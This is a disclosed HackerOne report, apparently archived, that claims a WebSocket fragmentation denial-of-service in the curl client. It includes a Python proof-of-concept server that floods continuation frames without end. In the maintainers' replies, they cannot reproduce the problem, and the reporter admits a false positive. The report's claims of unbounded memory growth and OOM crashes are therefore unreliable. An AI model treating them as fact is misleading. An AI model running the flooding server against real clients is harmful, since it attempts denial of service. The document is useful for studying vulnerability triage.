---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/uncontrolled-resource-consumption
  - env/web
  - vuln/dos
substate: "not-applicable"
weakness: "Uncontrolled Resource Consumption"
enriched: true
body: true
date: 2025-08-19
submitted: 2025-08-18T16:07:41.178Z
bounty_usd: null
votes: 32
cve: []
program: "[[programs/curl|curl]]"
reporter: "pelioro"
source: "https://hackerone.com/reports/3303765"
title: "WebSocket Fragmentation DoS on Curl Client"
---
# WebSocket Fragmentation DoS on Curl Client

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 32 | **Program:** curl | **Disclosed:** 2025-08-19

- Report: [https://hackerone.com/reports/3303765](https://hackerone.com/reports/3303765)
- CWE: Uncontrolled Resource Consumption
- Submitted: 2025-08-18T16:07:41.178Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

### Summary
A malicious WebSocket server can send a fragmented message (FIN=0) followed by a flood of continuation frames, causing the client (curl) to continuously allocate memory while waiting for message completion. This can result in high memory usage and potential crash (OOM), representing a Denial-of-Service vulnerability.

---

### Description
The vulnerability occurs because curl does not limit the number of continuation frames for an unfinished WebSocket message. An attacker controlling a WebSocket server can send:

1. Initial text frame with `FIN=0` (indicating message continuation).  
2. An unbounded number of continuation frames (`opcode=0`, `FIN=0`).  

This causes curl to continuously buffer incoming data until memory is exhausted. The script `ws_frag_poc.py` demonstrates the behavior.

---

### Steps to Reproduce
1. Save the following PoC script as `ws_frag_poc.py`:

```python
#!/usr/bin/env python3
# ws_frag_poc.py - DoS PoC for WebSocket fragmentation
import socket, base64, hashlib, threading

HOST, PORT = "0.0.0.0", 8765

def make_handshake_response(key):
    GUID = b"258EAFA5-E914-47DA-95CA-C5AB0DC85B11"
    accept = base64.b64encode(hashlib.sha1(key + GUID).digest()).decode()
    return (
        "HTTP/1.1 101 Switching Protocols\r\n"
        "Upgrade: websocket\r\n"
        "Connection: Upgrade\r\n"
        f"Sec-WebSocket-Accept: {accept}\r\n\r\n"
    ).encode()

def make_frame(fin, opcode, payload):
    first = (0x80 if fin else 0x00) | (opcode & 0x0f)
    plen = len(payload)
    header = bytes([first])
    if plen <= 125: header += bytes([plen])
    elif plen < 65536: header += bytes([126]) + plen.to_bytes(2, 'big')
    else: header += bytes([127]) + plen.to_bytes(8, 'big')
    return header + payload

def handle_client(conn, addr):
    data = conn.recv(4096)
    key = next((l.split(b":",1)[1].strip() for l in data.split(b"\r\n") if l.lower().startswith(b"sec-websocket-key:")), None)
    if not key: return conn.close()
    conn.sendall(make_handshake_response(key))
    conn.sendall(make_frame(fin=False, opcode=1, payload=b"X"*4))
    frag_payload = b"A"*32
    while True:
        conn.sendall(make_frame(fin=False, opcode=0, payload=frag_payload))

def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((HOST, PORT))
    s.listen(5)
    while True:
        conn, addr = s.accept()
        threading.Thread(target=handle_client, args=(conn, addr), daemon=True).start()

if __name__ == "__main__":
    main()
```

2. Run the PoC:  
```bash
python3 ws_frag_poc.py
```

3. In another terminal, connect using curl:  
```bash
curl --include --no-buffer --output /dev/null ws://127.0.0.1:8765
```

4. Monitor memory usage:  
```bash
ps -o pid,rss,cmd -p <curl_pid>
top -p <curl_pid>
ps aux | grep curl
```

---

### Expected Result
Curl should handle fragmented messages without unbounded memory growth.

### Actual Result
Memory usage grows continuously, CPU spikes, process may hang or crash (OOM).

---

### Mitigation / Recommendation
- Implement limits on the number of continuation frames for unfinished WebSocket messages.  
- Consider maximum message size or memory allocation threshold to prevent client-side DoS.  
- Add proper validation of FIN/fragmented frames in the WebSocket implementation.

---

### References
- [RFC 6455 - The WebSocket Protocol](https://datatracker.ietf.org/doc/html/rfc6455)
- CWE-400: Uncontrolled Resource Consumption

## Impact

- High memory consumption on the client.  
- Potential crash or process termination (OOM) in curl.  
- Can be triggered remotely if the client connects to a malicious WebSocket server.

## Timeline

- **Report Filed**
- **2025-08-18** @bagder: Thank you for your report!

We will take some time and investigate your reports and get back to you with details and possible follow-up questions as soon as we can! Most likely within the next 24 hours.

We always strive to fix reported problems as fast as possible. Issues with severity Low or Medium we merge into the next release in the ordinary release cycle. Only for more serious problems we might  release fix early.
- **2025-08-18** @bagder: @pelioro which curl version running on which platform ?
- **2025-08-18** @icing: Thanks for the report. I am running your PoC against the current curl master and see no memory increase. It stays flat at 4.5 MB on my macOS system.

Are you testing another version of curl and if so, which? Thanks.
- **2025-08-18** @bagder: @pelioro a few more questions:

1. Did you use an AI to generate this report? If not, how come you claim "Memory usage grows continuously" when this in fact does not happen? How can such a mistake be made? And how come you didn't verify this before you submitted this to us?
2. "Potential crash or process termination (OOM) in curl." you write. Where and how would it crash (exact line number and stack traces please)? On which allocation would it "terminate the process" ?
- **2025-08-19** @pelioro: Hi, quick clarification about my environment:  

```
curl 8.13.0 (x86_64-pc-linux-gnu) libcurl/8.13.0 OpenSSL/3.5.0 zlib/1.3.1 brotli/1.1.0 zstd/1.5.7 libidn2/2.3.8 libpsl/0.21.2 libssh2/1.11.1 nghttp2/1.64.0 nghttp3/1.8.0 librtmp/2.3 OpenLDAP/2.6.9
Release-Date: 2025-04-02, security patched: 8.13.0-5
Protocols: dict file ftp ftps gopher gophers http https imap imaps ipfs ipns ldap ldaps mqtt pop3 pop3s rtmp rtsp scp sftp smb smbs smtp smtps telnet tftp ws wss
Features: alt-svc AsynchDNS brotli GSS-API HSTS HTTP2 HTTP3 HTTPS-proxy IDN IPv6 Kerberos Largefile libz NTLM PSL SPNEGO SSL threadsafe TLS-SRP UnixSockets zstd
```

Running on **Kali Linux (WSL2 on Windows 11, x86_64)**.  

When executing the PoC (`ws_frag_poc.py`), memory usage starts ~5 MB and keeps increasing until it reaches 200+ MB, eventually killed by the OOM killer.  

I’ll try rebuilding from the latest master to confirm if this behavior is already fixed upstream. If so, the issue may still affect users on packaged releases like Debian/Kali/Ubuntu.
- **2025-08-19** @pelioro: {F4692718}
- **2025-08-19** @dfandrich: Is that screenshot showing that there is no problem in the version from master?
- **2025-08-19** @icing: Does not your screenshot show that curl occupies ~13 MB of memory?
- **2025-08-19** @bagder: I just built 8.13.0 and reran the command line and this version does not grow for me either.
- **2025-08-19** @pelioro: Hey all,

Just double-checked my tests and looks like I was wrong — this is a false positive on my side. Memory doesn’t actually grow on the latest master build.

Sorry for the mix-up and thanks for your patience!

Pelioro
- **Report Not Applicable**
- **Agreed On Going Public**
- **Manually Disclosed**
